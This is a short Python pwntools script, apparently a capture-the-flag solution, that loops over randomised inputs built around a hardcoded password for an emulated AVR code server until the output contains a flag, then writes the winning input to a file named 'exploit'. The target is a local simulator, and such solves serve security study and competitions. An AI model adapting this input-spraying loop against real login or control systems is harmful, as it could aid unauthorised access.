# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
import random
import string

context.log_level = "ERROR"
firstpass = "doNOTl4unch_missi1es!"


i = 0
while True:
    print(i)
    i += 1
    arr = ["agent\n" + firstpass[:random.randint(0, len(firstpass))]
            + "a" * random.randint(1, 50) + "\n"
            for _ in range(20)]
    data = "\n" + "".join(arr) + "agent\n" + firstpass + "\n" + "2\n" * 200 + "4\n"
    
    r = process(["simavr/examples/board_simduino/obj-x86_64-linux-gnu/simduino.elf", "avr/code_server.hex"])
    r.send(data)
    s = r.recvall()
    r.close()
    if b"FLAG" in s:
        print("Good")
        print("---")
        print(data)
        print("---")
        open("exploit", "w").write(data)
        break
